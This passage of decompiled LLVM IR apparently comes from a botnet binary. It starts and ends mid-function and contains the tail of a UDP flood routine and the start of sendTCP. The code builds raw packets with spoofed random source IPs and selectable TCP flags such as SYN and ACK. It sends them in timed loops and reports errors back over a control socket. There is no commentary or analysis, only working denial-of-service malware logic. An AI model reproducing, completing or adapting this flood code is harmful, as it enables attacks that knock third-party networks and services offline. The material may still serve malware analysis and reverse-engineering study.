dec_label_pc_100090f8:                            ; preds = %dec_label_pc_100090f8.outer, %dec_label_pc_10009160
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10009160 ], [ %stack_var_-44.0.ph, %dec_label_pc_100090f8.outer ]
  store i32 268472604, i32* @lr, align 4
  %v7_10009118 = call i32 @__libc_sendto(i32 %v3_10009044, i32 %v0_10009088, i32 %arg5, i32 0, i32 %v2_10008fec, i32 16, i32 %v2_10008fec)
  %v4_10009124 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10009124, label %dec_label_pc_1000912c, label %dec_label_pc_1000916c

dec_label_pc_1000912c:                            ; preds = %dec_label_pc_100090f8
  br i1 %v3_10008fb8, label %dec_label_pc_10009138, label %dec_label_pc_10009148

dec_label_pc_10009138:                            ; preds = %dec_label_pc_1000912c
  %v0_10009138 = call i32 @rand_cmwc()
  br label %dec_label_pc_10009148

dec_label_pc_10009148:                            ; preds = %dec_label_pc_1000912c, %dec_label_pc_10009138
  store i32 268472656, i32* @lr, align 4
  %v1_1000914c = call i32 @__GI_time(i32 0)
  %v3_10009158 = icmp sgt i32 %v1_1000914c, %v2_100090dc
  br i1 %v3_10009158, label %dec_label_pc_100095d8, label %dec_label_pc_10009160

dec_label_pc_10009160:                            ; preds = %dec_label_pc_10009148
  br label %dec_label_pc_100090f8

dec_label_pc_1000916c:                            ; preds = %dec_label_pc_100090f8
  %v1_10009170 = add i32 %stack_var_-44.0, 1
  %v4_10009180 = icmp eq i32 %stack_var_-48.0.ph, %arg7
  br i1 %v4_10009180, label %dec_label_pc_10009188, label %dec_label_pc_100091a4

dec_label_pc_10009188:                            ; preds = %dec_label_pc_1000916c
  store i32 ptrtoint ([3 x i8]* @global_var_10009198.359 to i32), i32* @lr, align 4
  %v2_10009194 = call i32 @usleep(i32 %v1_1000918c, i32 %arg7)
  br label %dec_label_pc_100090f8.outer.backedge

dec_label_pc_100090f8.outer.backedge:             ; preds = %dec_label_pc_10009188, %dec_label_pc_100091a4
  %storemerge27 = phi i32 [ %v1_100091a8, %dec_label_pc_100091a4 ], [ 0, %dec_label_pc_10009188 ]
  br label %dec_label_pc_100090f8.outer

dec_label_pc_100091a4:                            ; preds = %dec_label_pc_1000916c
  %v1_100091a8 = add i32 %stack_var_-48.0.ph, 1
  br label %dec_label_pc_100090f8.outer.backedge

dec_label_pc_100091b4:                            ; preds = %dec_label_pc_1000900c
  store i32 268472780, i32* @lr, align 4
  %v3_100091c8 = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_100091d8 = icmp eq i32 %v3_100091c8, 0
  br i1 %v3_100091d8, label %dec_label_pc_100091e0, label %dec_label_pc_10009200

dec_label_pc_100091e0:                            ; preds = %dec_label_pc_100091b4
  %v3_100091e4 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_100091fc.360 to i32), i32* @lr, align 4
  %v4_100091f8 = call i32 @sockprintf(i32 %v3_100091e4, i32 ptrtoint ([27 x i8]* @global_var_100164e0.356 to i32), i32 268500992)
  br label %dec_label_pc_100095c8

dec_label_pc_10009200:                            ; preds = %dec_label_pc_100091b4
  store i32 1, i32* %stack_var_-96, align 4
  %v2_10009208 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268472868, i32* @lr, align 4
  %v5_10009220 = call i32 @__GI_setsockopt(i32 %v3_100091c8, i32 0, i32 3, i32 %v2_10009208, i32 4)
  %tmp77 = icmp sgt i32 %v5_10009220, -1
  br i1 %tmp77, label %dec_label_pc_10009250, label %dec_label_pc_10009230

dec_label_pc_10009230:                            ; preds = %dec_label_pc_10009200
  %v3_10009234 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000924c.362 to i32), i32* @lr, align 4
  %v4_10009248 = call i32 @sockprintf(i32 %v3_10009234, i32 ptrtoint ([33 x i8]* @global_var_100164fc.361 to i32), i32 268500992)
  br label %dec_label_pc_100095c8

dec_label_pc_10009250:                            ; preds = %dec_label_pc_10009200
  br label %dec_label_pc_1000925c

dec_label_pc_1000925c:                            ; preds = %dec_label_pc_10009250, %dec_label_pc_1000925c
  %v1_1000929422 = phi i32 [ 49, %dec_label_pc_10009250 ], [ %v1_10009294, %dec_label_pc_1000925c ]
  store i32 268472932, i32* @lr, align 4
  %v1_10009260 = call i32 @__GI_time(i32 0)
  %v0_1000926c = call i32 @rand_cmwc()
  %v2_10009274 = xor i32 %v1_10009260, %v0_1000926c
  store i32 ptrtoint (i32* @global_var_10009280.363 to i32), i32* @lr, align 4
  %v1_1000927c = call i32 @srand(i32 %v2_10009274)
  store i32 268472964, i32* @lr, align 4
  %v0_10009280 = call i32 @random()
  %v1_1000928c = call i32 @init_rand(i32 %v0_10009280)
  %v1_10009294 = add nsw i32 %v1_1000929422, -1
  %v4_100092a4 = icmp eq i32 %v1_1000929422, 0
  br i1 %v4_100092a4, label %dec_label_pc_100092ac, label %dec_label_pc_1000925c

dec_label_pc_100092ac:                            ; preds = %dec_label_pc_1000925c
  %v3_100092b0 = icmp eq i32 %arg4, 0
  br i1 %v3_100092b0, label %dec_label_pc_100092dc, label %dec_label_pc_100092c4

dec_label_pc_100092c4:                            ; preds = %dec_label_pc_100092ac
  %v1_100092c8 = sub i32 32, %arg4
  %v2_100092d0 = urem i32 %v1_100092c8, 64
  %v1_100092d4 = shl i32 -1, %v2_100092d0
  br label %dec_label_pc_100092dc

dec_label_pc_100092dc:                            ; preds = %dec_label_pc_100092ac, %dec_label_pc_100092c4
  %storemerge10 = phi i32 [ %v1_100092d4, %dec_label_pc_100092c4 ], [ 0, %dec_label_pc_100092ac ]
  %v1_100092e0 = add i32 %arg5, 28
  %v1_100092f0 = add i32 %arg5, 58
  %v1_100092f4 = and i32 %v1_100092f0, -16
  %v2_100092fc = load i32, i32* %stack_var_-160, align 4
  %v1_10009304 = load i32, i32* @r1, align 4
  %v3_10009304 = sub i32 %v1_10009304, %v1_100092f4
  %v4_10009304 = inttoptr i32 %v3_10009304 to i32*
  store i32 %v2_100092fc, i32* %v4_10009304, align 4
  %v1_10009314 = add i32 %v3_10009304, 23
  %v1_10009318 = and i32 %v1_10009314, -16
  %v1_10009338 = add i32 %v1_10009318, 20
  %v5_1000933c = inttoptr i32 %v1_10009338 to i16*
  %v3_10009340 = load i32, i32* %stack_var_-108, align 4
  %v1_10009348 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10009348, i32* @r3, align 4
  %v1_10009354 = call i32 @htonl(i32 %v1_10009348)
  %v1_10009360 = add i32 %arg5, 8
  %v6_10009378 = inttoptr i32 %v1_10009318 to i32*
  %v7_10009378 = call i32 @makeIPPacket(i32* %v6_10009378, i32 %v3_10009340, i32 %v1_10009354, i32 17, i32 %v1_10009360, i32 %arg5)
  %v1_10009388 = urem i32 %v1_10009360, 65536
  store i32 %v1_10009388, i32* @r3, align 4
  %v1_10009390 = call i32 @htons(i32 %v1_10009388)
  %sext = mul i32 %v1_10009390, 65536
  %v1_10009394 = sdiv i32 %sext, 65536
  %v1_1000939c = trunc i32 %v1_10009394 to i16
  %v3_1000939c = add i32 %v1_10009318, 24
  %v4_1000939c = inttoptr i32 %v3_1000939c to i16*
  store i16 %v1_1000939c, i16* %v4_1000939c, align 8
  %v0_100093a0 = call i32 @rand_cmwc()
  %v1_100093b0 = trunc i32 %v0_100093a0 to i16
  store i16 %v1_100093b0, i16* %v5_1000933c, align 4
  br i1 %v3_10008fb8, label %dec_label_pc_100093c0, label %dec_label_pc_100093d4

dec_label_pc_100093c0:                            ; preds = %dec_label_pc_100092dc
  %v0_100093c0 = call i32 @rand_cmwc()
  %extract.t87 = trunc i32 %v0_100093c0 to i16
  br label %dec_label_pc_100093ec

dec_label_pc_100093d4:                            ; preds = %dec_label_pc_100092dc
  %v1_100093d8 = urem i32 %arg2, 65536
  store i32 %v1_100093d8, i32* @r3, align 4
  %v1_100093e0 = call i32 @htons(i32 %v1_100093d8)
  %extract.t = trunc i32 %v1_100093e0 to i16
  br label %dec_label_pc_100093ec

dec_label_pc_100093ec:                            ; preds = %dec_label_pc_100093c0, %dec_label_pc_100093d4
  %storemerge78.off0 = phi i16 [ %extract.t, %dec_label_pc_100093d4 ], [ %extract.t87, %dec_label_pc_100093c0 ]
  %v1_100094cc.pre-phi = phi i32 [ %v1_100093d8, %dec_label_pc_100093d4 ], [ 0, %dec_label_pc_100093c0 ]
  %v3_100093f4 = add i32 %v1_10009318, 22
  %v4_100093f4 = inttoptr i32 %v3_100093f4 to i16*
  store i16 %storemerge78.off0, i16* %v4_100093f4, align 2
  %v3_10009400 = add i32 %v1_10009318, 26
  %v4_10009400 = inttoptr i32 %v3_10009400 to i16*
  store i16 0, i16* %v4_10009400, align 2
  %v1_10009408 = add i32 %v1_10009318, 28
  %v2_10009414 = call i32 @makeRandomStr(i32 %v1_10009408, i32 %arg5)
  %v1_10009424 = or i32 %v1_10009318, 2
  %v2_10009424 = inttoptr i32 %v1_10009424 to i16*
  %v3_10009424 = load i16, i16* %v2_10009424, align 2
  %v4_10009424 = zext i16 %v3_10009424 to i32
  %v5_10009434 = inttoptr i32 %v1_10009318 to i16*
  %v6_10009434 = call i32 @csum(i16* %v5_10009434, i32 %v4_10009424, i32 %v1_10009318, i32 17, i32 %v1_10009360)
  %sext4 = mul i32 %v6_10009434, 65536
  %v1_10009438 = sdiv i32 %sext4, 65536
  %v1_10009440 = trunc i32 %v1_10009438 to i16
  %v3_10009440 = or i32 %v1_10009318, 10
  %v4_10009440 = inttoptr i32 %v3_10009440 to i16*
  store i16 %v1_10009440, i16* %v4_10009440, align 2
  store i32 268473420, i32* @lr, align 4
  %v1_10009448 = call i32 @__GI_time(i32 0)
  %v2_10009454 = add i32 %v1_10009448, %arg3
  %v3_100094fc = or i32 %v1_10009318, 4
  %v4_100094fc = inttoptr i32 %v3_100094fc to i16*
  %v2_1000951c = or i32 %v1_10009318, 12
  %v3_1000951c = inttoptr i32 %v2_1000951c to i32*
  %v1_100095a0 = mul i32 %v0_10008fa8, 1000
  br label %dec_label_pc_10009470.outer

dec_label_pc_10009470.outer:                      ; preds = %dec_label_pc_10009470.outer.backedge, %dec_label_pc_100093ec
  %stack_var_-56.0.ph = phi i32 [ 0, %dec_label_pc_100093ec ], [ %storemerge26, %dec_label_pc_10009470.outer.backedge ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_100093ec ], [ %v1_10009584, %dec_label_pc_10009470.outer.backedge ]
  br label %dec_label_pc_10009470

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009470.outer, %dec_label_pc_10009574
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_10009574 ], [ %stack_var_-52.0.ph, %dec_label_pc_10009470.outer ]
  store i32 268473492, i32* @lr, align 4
  %v7_10009490 = call i32 @__libc_sendto(i32 %v3_100091c8, i32 %v1_10009318, i32 %v1_100092e0, i32 0, i32 %v2_10008fec, i32 16, i32 %v2_10008fec)
  %v0_10009494 = call i32 @rand_cmwc()
  %v1_100094a4 = trunc i32 %v0_10009494 to i16
  store i16 %v1_100094a4, i16* %v5_1000933c, align 4
  br i1 %v3_10008fb8, label %dec_label_pc_100094b4, label %dec_label_pc_100094c8

dec_label_pc_100094b4:                            ; preds = %dec_label_pc_10009470
  %v0_100094b4 = call i32 @rand_cmwc()
  %extract.t89 = trunc i32 %v0_100094b4 to i16
  br label %dec_label_pc_100094e0

dec_label_pc_100094c8:                            ; preds = %dec_label_pc_10009470
  store i32 %v1_100094cc.pre-phi, i32* @r3, align 4
  %v1_100094d4 = call i32 @htons(i32 %v1_100094cc.pre-phi)
  %extract.t88 = trunc i32 %v1_100094d4 to i16
  br label %dec_label_pc_100094e0

dec_label_pc_100094e0:                            ; preds = %dec_label_pc_100094b4, %dec_label_pc_100094c8
  %storemerge80.off0 = phi i16 [ %extract.t88, %dec_label_pc_100094c8 ], [ %extract.t89, %dec_label_pc_100094b4 ]
  store i16 %storemerge80.off0, i16* %v4_100093f4, align 2
  %v0_100094ec = call i32 @rand_cmwc()
  %v1_100094fc = trunc i32 %v0_100094ec to i16
  store i16 %v1_100094fc, i16* %v4_100094fc, align 4
  %v1_10009504 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10009504, i32* @r3, align 4
  %v1_10009510 = call i32 @htonl(i32 %v1_10009504)
  store i32 %v1_10009510, i32* %v3_1000951c, align 4
  %v3_1000952c = load i16, i16* %v2_10009424, align 2
  %v4_1000952c = zext i16 %v3_1000952c to i32
  %v6_1000953c = call i32 @csum(i16* %v5_10009434, i32 %v4_1000952c, i32 %v1_10009318, i32 0, i32 %v2_10008fec)
  %v1_10009548 = trunc i32 %v6_1000953c to i16
  store i16 %v1_10009548, i16* %v4_10009440, align 2
  %v4_10009554 = icmp eq i32 %stack_var_-52.0, %arg6
  br i1 %v4_10009554, label %dec_label_pc_1000955c, label %dec_label_pc_10009580

dec_label_pc_1000955c:                            ; preds = %dec_label_pc_100094e0
  store i32 268473700, i32* @lr, align 4
  %v1_10009560 = call i32 @__GI_time(i32 0)
  %v3_1000956c = icmp sgt i32 %v1_10009560, %v2_10009454
  br i1 %v3_1000956c, label %dec_label_pc_100095c8, label %dec_label_pc_10009574

dec_label_pc_10009574:                            ; preds = %dec_label_pc_1000955c
  br label %dec_label_pc_10009470

dec_label_pc_10009580:                            ; preds = %dec_label_pc_100094e0
  %v1_10009584 = add i32 %stack_var_-52.0, 1
  %v4_10009594 = icmp eq i32 %stack_var_-56.0.ph, %arg7
  br i1 %v4_10009594, label %dec_label_pc_1000959c, label %dec_label_pc_100095b8

dec_label_pc_1000959c:                            ; preds = %dec_label_pc_10009580
  store i32 ptrtoint ([3 x i8]* @global_var_100095ac.364 to i32), i32* @lr, align 4
  %v2_100095a8 = call i32 @usleep(i32 %v1_100095a0, i32 %arg7)
  br label %dec_label_pc_10009470.outer.backedge

dec_label_pc_10009470.outer.backedge:             ; preds = %dec_label_pc_1000959c, %dec_label_pc_100095b8
  %storemerge26 = phi i32 [ %v1_100095bc, %dec_label_pc_100095b8 ], [ 0, %dec_label_pc_1000959c ]
  br label %dec_label_pc_10009470.outer

dec_label_pc_100095b8:                            ; preds = %dec_label_pc_10009580
  %v1_100095bc = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_10009470.outer.backedge

dec_label_pc_100095c8:                            ; preds = %dec_label_pc_1000955c, %dec_label_pc_10009230, %dec_label_pc_100091e0
  %v0_100095f031 = phi i32 [ %v4_10009248, %dec_label_pc_10009230 ], [ %v4_100091f8, %dec_label_pc_100091e0 ], [ %v1_10009560, %dec_label_pc_1000955c ]
  br label %dec_label_pc_100095d8

dec_label_pc_100095d8:                            ; preds = %dec_label_pc_10009148, %dec_label_pc_10008fec, %dec_label_pc_1000907c, %dec_label_pc_1000905c, %dec_label_pc_100095c8
  %v0_100095f0 = phi i32 [ %v4_10008ffc, %dec_label_pc_10008fec ], [ 0, %dec_label_pc_1000907c ], [ %v4_10009074, %dec_label_pc_1000905c ], [ %v0_100095f031, %dec_label_pc_100095c8 ], [ %v1_1000914c, %dec_label_pc_10009148 ]
  ret i32 %v0_100095f0

; uselistorder directives
  uselistorder i32 %v1_100094cc.pre-phi, { 1, 0 }
  uselistorder i32 %v1_100093d8, { 2, 1, 0 }
  uselistorder i32 %v1_10009388, { 1, 0 }
  uselistorder i32 %v1_10009360, { 2, 0, 1 }
  uselistorder i32 %v1_10009318, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10008fec, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %v1_10008fd8, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32, i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_100095d8, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009470.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100094e0, { 1, 0 }
  uselistorder label %dec_label_pc_10009470, { 1, 0 }
  uselistorder label %dec_label_pc_100093ec, { 1, 0 }
  uselistorder label %dec_label_pc_100092dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000925c, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10009148, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8, { 1, 0 }
  uselistorder label %dec_label_pc_10008fec, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100095f4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100095f4, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_10009644 = icmp eq i32 %arg2, 0
  br i1 %v3_10009644, label %dec_label_pc_1000964c, label %dec_label_pc_10009660

dec_label_pc_1000964c:                            ; preds = %entry
  %v0_1000964c = call i32 @rand_cmwc()
  br label %dec_label_pc_10009678

dec_label_pc_10009660:                            ; preds = %entry
  %v1_10009664 = urem i32 %arg2, 65536
  store i32 %v1_10009664, i32* @r3, align 4
  %v1_1000966c = call i32 @htons(i32 %v1_10009664)
  br label %dec_label_pc_10009678

dec_label_pc_10009678:                            ; preds = %dec_label_pc_1000964c, %dec_label_pc_10009660
  %v2_10009678 = ptrtoint i32* %stack_var_-92 to i32
  %v4_10009688 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_10009678)
  %v3_10009690 = icmp eq i32 %v4_10009688, 0
  br i1 %v3_10009690, label %dec_label_pc_1000969c, label %dec_label_pc_10009c20

dec_label_pc_1000969c:                            ; preds = %dec_label_pc_10009678
  store i32 268474052, i32* @lr, align 4
  %v3_100096c0 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_100096d0 = icmp eq i32 %v3_100096c0, 0
  br i1 %v3_100096d0, label %dec_label_pc_100096d8, label %dec_label_pc_100096f8

dec_label_pc_100096d8:                            ; preds = %dec_label_pc_1000969c
  %v3_100096dc = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_100096f4.365 to i32), i32* @lr, align 4
  %v4_100096f0 = call i32 @sockprintf(i32 %v3_100096dc, i32 ptrtoint ([27 x i8]* @global_var_100164e0.356 to i32), i32 268500992)
  br label %dec_label_pc_10009c20

dec_label_pc_100096f8:                            ; preds = %dec_label_pc_1000969c
  store i32 1, i32* %stack_var_-76, align 4
  %v2_10009700 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268474140, i32* @lr, align 4
  %v5_10009718 = call i32 @__GI_setsockopt(i32 %v3_100096c0, i32 0, i32 3, i32 %v2_10009700, i32 4)
  %tmp59 = icmp sgt i32 %v5_10009718, -1
  br i1 %tmp59, label %dec_label_pc_10009748, label %dec_label_pc_10009728

dec_label_pc_10009728:                            ; preds = %dec_label_pc_100096f8
  %v3_1000972c = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_10009744.366 to i32), i32* @lr, align 4
  %v4_10009740 = call i32 @sockprintf(i32 %v3_1000972c, i32 ptrtoint ([33 x i8]* @global_var_100164fc.361 to i32), i32 268500992)
  br label %dec_label_pc_10009c20

dec_label_pc_10009748:                            ; preds = %dec_label_pc_100096f8
  %v3_1000974c = icmp eq i32 %arg4, 0
  br i1 %v3_1000974c, label %dec_label_pc_10009778, label %dec_label_pc_10009760

dec_label_pc_10009760:                            ; preds = %dec_label_pc_10009748
  %v1_10009764 = sub i32 32, %arg4
  %v2_1000976c = urem i32 %v1_10009764, 64
  %v1_10009770 = shl i32 -1, %v2_1000976c
  br label %dec_label_pc_10009778

dec_label_pc_10009778:                            ; preds = %dec_label_pc_10009748, %dec_label_pc_10009760
  %storemerge9 = phi i32 [ %v1_10009770, %dec_label_pc_10009760 ], [ 0, %dec_label_pc_10009748 ]
  %v1_1000977c = add i32 %arg6, 40
  %v1_1000978c = add i32 %arg6, 70
  %v1_10009790 = and i32 %v1_1000978c, -16
  %v2_10009798 = load i32, i32* %stack_var_-128, align 4
  %v1_100097a0 = load i32, i32* @r1, align 4
  %v3_100097a0 = sub i32 %v1_100097a0, %v1_10009790
  %v4_100097a0 = inttoptr i32 %v3_100097a0 to i32*
  store i32 %v2_10009798, i32* %v4_100097a0, align 4
  %v1_100097b0 = add i32 %v3_100097a0, 23
  %v1_100097b4 = and i32 %v1_100097b0, -16
  %v1_100097d4 = add i32 %v1_100097b4, 20
  %v5_100097d8 = inttoptr i32 %v1_100097d4 to i16*
  %v3_100097dc = load i32, i32* %stack_var_-88, align 4
  %v1_100097e4 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_100097e4, i32* @r3, align 4
  %v1_100097f0 = call i32 @htonl(i32 %v1_100097e4)
  %v1_100097fc = add i32 %arg6, 20
  %v6_10009814 = inttoptr i32 %v1_100097b4 to i32*
  %v7_10009814 = call i32 @makeIPPacket(i32* %v6_10009814, i32 %v3_100097dc, i32 %v1_100097f0, i32 6, i32 %v1_100097fc, i32 %arg6)
  %v0_10009818 = call i32 @rand_cmwc()
  %v1_10009828 = trunc i32 %v0_10009818 to i16
  store i16 %v1_10009828, i16* %v5_100097d8, align 4
  %v0_1000982c = call i32 @rand_cmwc()
  %v2_10009838 = add i32 %v1_100097b4, 24
  %v3_10009838 = inttoptr i32 %v2_10009838 to i32*
  store i32 %v0_1000982c, i32* %v3_10009838, align 8
  %v2_10009844 = add i32 %v1_100097b4, 28
  %v3_10009844 = inttoptr i32 %v2_10009844 to i32*
  store i32 0, i32* %v3_10009844, align 4
  %v1_1000984c = add i32 %v1_100097b4, 32
  %v2_1000984c = inttoptr i32 %v1_1000984c to i32*
  %v1_10009854 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_10009858 = add i32 %v1_100097b4, 32
  %v3_10009858 = inttoptr i32 %v2_10009858 to i32*
  store i32 %v1_10009854, i32* %v3_10009858, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10016520.367 to i32), i32* @r4, align 4
  %v3_1000986c = inttoptr i32 %arg5 to i8*
  %v4_1000986c = call i32 @__GI_strcoll(i8* %v3_1000986c, i32 ptrtoint ([4 x i8]* @global_var_10016520.367 to i32))
  %v3_10009874 = icmp eq i32 %v4_1000986c, 0
  br i1 %v3_10009874, label %dec_label_pc_1000987c, label %dec_label_pc_100098d0

dec_label_pc_1000987c:                            ; preds = %dec_label_pc_10009778
  %v3_10009880 = load i32, i32* %v2_1000984c, align 16
  %v1_100098c4 = or i32 %v3_10009880, 2031616
  store i32 %v1_100098c4, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a38

dec_label_pc_100098d0:                            ; preds = %dec_label_pc_10009778
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268474596, i32* @lr, align 4
  %v3_100098e0 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_10009a3018 = icmp eq i32 %v3_100098e0, 0
  br i1 %v3_10009a3018, label %dec_label_pc_10009a38, label %dec_label_pc_100098f0

dec_label_pc_100098f0:                            ; preds = %dec_label_pc_100098d0, %dec_label_pc_10009a14
  %storemerge1319 = phi i32 [ %v3_10009a20, %dec_label_pc_10009a14 ], [ %v3_100098e0, %dec_label_pc_100098d0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10016528.369 to i32), i32* @r4, align 4
  %v3_10009900 = inttoptr i32 %storemerge1319 to i8*
  %v4_10009900 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10016528.369 to i32))
  %v3_10009908 = icmp eq i32 %v4_10009900, 0
  br i1 %v3_10009908, label %dec_label_pc_10009910, label %dec_label_pc_10009924

dec_label_pc_10009910:                            ; preds = %dec_label_pc_100098f0
  %v3_10009914 = load i32, i32* %v2_1000984c, align 16
  %v1_10009918 = or i32 %v3_10009914, 131072
  store i32 %v1_10009918, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_10009924:                            ; preds = %dec_label_pc_100098f0
  store i32 ptrtoint ([4 x i8]* @global_var_1001652c.370 to i32), i32* @r4, align 4
  %v4_10009934 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_1001652c.370 to i32))
  %v3_1000993c = icmp eq i32 %v4_10009934, 0
  br i1 %v3_1000993c, label %dec_label_pc_10009944, label %dec_label_pc_10009958

dec_label_pc_10009944:                            ; preds = %dec_label_pc_10009924
  %v3_10009948 = load i32, i32* %v2_1000984c, align 16
  %v1_1000994c = or i32 %v3_10009948, 262144
  store i32 %v1_1000994c, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_10009958:                            ; preds = %dec_label_pc_10009924
  store i32 ptrtoint ([4 x i8]* @global_var_10016530.371 to i32), i32* @r4, align 4
  %v4_10009968 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10016530.371 to i32))
  %v3_10009970 = icmp eq i32 %v4_10009968, 0
  br i1 %v3_10009970, label %dec_label_pc_10009978, label %dec_label_pc_1000998c

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009958
  %v3_1000997c = load i32, i32* %v2_1000984c, align 16
  %v1_10009980 = or i32 %v3_1000997c, 65536
  store i32 %v1_10009980, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_1000998c:                            ; preds = %dec_label_pc_10009958
  store i32 ptrtoint ([4 x i8]* @global_var_10016534.372 to i32), i32* @r4, align 4
  %v4_1000999c = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10016534.372 to i32))
  %v3_100099a4 = icmp eq i32 %v4_1000999c, 0
  br i1 %v3_100099a4, label %dec_label_pc_100099ac, label %dec_label_pc_100099c0

dec_label_pc_100099ac:                            ; preds = %dec_label_pc_1000998c
  %v3_100099b0 = load i32, i32* %v2_1000984c, align 16
  %v1_100099b4 = or i32 %v3_100099b0, 1048576
  store i32 %v1_100099b4, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_100099c0:                            ; preds = %dec_label_pc_1000998c
  store i32 ptrtoint ([4 x i8]* @global_var_10016538.373 to i32), i32* @r4, align 4
  %v4_100099d0 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10016538.373 to i32))
  %v3_100099d8 = icmp eq i32 %v4_100099d0, 0
  br i1 %v3_100099d8, label %dec_label_pc_100099e0, label %dec_label_pc_100099f4

dec_label_pc_100099e0:                            ; preds = %dec_label_pc_100099c0
  %v3_100099e4 = load i32, i32* %v2_1000984c, align 16
  %v1_100099e8 = or i32 %v3_100099e4, 524288
  store i32 %v1_100099e8, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_100099f4:                            ; preds = %dec_label_pc_100099c0
  %v3_100099f8 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009a14.375 to i32), i32* @lr, align 4
  %v5_10009a10 = call i32 @sockprintf(i32 %v3_100099f8, i32 ptrtoint ([18 x i8]* @global_var_1001653c.374 to i32), i32 %storemerge1319)
  br label %dec_label_pc_10009a14

dec_label_pc_10009a14:                            ; preds = %dec_label_pc_100099e0, %dec_label_pc_100099ac, %dec_label_pc_10009978, %dec_label_pc_10009944, %dec_label_pc_10009910, %dec_label_pc_100099f4
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268474916, i32* @lr, align 4
  %v3_10009a20 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_10009a30 = icmp eq i32 %v3_10009a20, 0
  br i1 %v3_10009a30, label %dec_label_pc_10009a38, label %dec_label_pc_100098f0

dec_label_pc_10009a38:                            ; preds = %dec_label_pc_10009a14, %dec_label_pc_100098d0, %dec_label_pc_1000987c
  %v0_10009a38 = call i32 @rand_cmwc()
  %v1_10009a48 = trunc i32 %v0_10009a38 to i16
  %v3_10009a48 = add i32 %v1_100097b4, 34
  %v4_10009a48 = inttoptr i32 %v3_10009a48 to i16*
  store i16 %v1_10009a48, i16* %v4_10009a48, align 2
  %v3_10009a54 = add i32 %v1_100097b4, 36
  %v4_10009a54 = inttoptr i32 %v3_10009a54 to i16*
  store i16 0, i16* %v4_10009a54, align 4
  %v3_10009a60 = add i32 %v1_100097b4, 38
  %v4_10009a60 = inttoptr i32 %v3_10009a60 to i16*
  store i16 0, i16* %v4_10009a60, align 2
  br i1 %v3_10009644, label %dec_label_pc_10009a70, label %dec_label_pc_10009a84

dec_label_pc_10009a70:                            ; preds = %dec_label_pc_10009a38
  %v0_10009a70 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_10009a70 to i16
  br label %dec_label_pc_10009a9c

dec_label_pc_10009a84:                            ; preds = %dec_label_pc_10009a38
  %v1_10009a88 = urem i32 %arg2, 65536
